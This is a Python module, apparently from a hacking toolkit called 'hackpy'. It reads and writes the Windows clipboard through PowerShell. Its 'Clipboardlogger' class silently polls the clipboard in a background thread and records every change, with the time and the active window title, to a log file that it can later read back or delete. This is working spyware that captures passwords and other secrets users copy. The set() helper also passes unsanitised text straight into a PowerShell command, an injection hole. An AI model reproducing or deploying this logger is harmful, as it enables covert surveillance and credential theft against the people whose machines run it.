from os              import remove, path
from threading       import Thread
from hackpy.commands import *
from hackpy.activity import *
from hackpy.time     import *

##|
##| hackpy.clipboard.set('Text') # Copy text to clipboard
##| print('Data in clipboard:' + clipboard.get()) # Get text from clipboard
##|
def set(text = ''):
    command.powershell('Set-Clipboard ' + text)

def get():
    text = command.powershell('Get-Clipboard')
    return text

# ClipboardLogger module
class Clipboardlogger:
	def __init__(self, filename = 'clipboardlogs.txt'):
		self.filename = filename

	def startHackpyClipboardLogger(self):
		global hackpyClipboardLoggerIsStopped
		hackpyClipboardLoggerIsStopped = False
		old_data = ''
		while not hackpyClipboardLoggerIsStopped:
			new_data = get()
			if new_data != old_data:
				with open(self.filename, 'a', encoding = "utf8", errors = 'ignore') as logs:
					logs.write('(' + date.all() + ') - [' + getActiveWindow() + '] - \"' + new_data + '\"\n')
				old_data = new_data
			sleep(1.5)

	# Start Clipboardlogger
	def start(self):
		s = Thread(target=self.startHackpyClipboardLogger)
		s.start()

	# Stop Clipboardlogger
	def stop(self):
		global hackpyClipboardLoggerIsStopped
		hackpyClipboardLoggerIsStopped = True

	# Get logs
	def getLogs(self):
		if path.exists(self.filename):
			logs_lines = []
			with open(self.filename, 'r', encoding = "utf8", errors = 'ignore') as logs_file:
				lines = logs_file.readlines()
			for line in lines:
				line = line.replace('\n', '')
				logs_lines.append(line)
			return logs_lines
		else:
			return False

	# Delete logs file
	def cleanLogs(self):
		try:
			remove(self.filename)
		except:
			pass

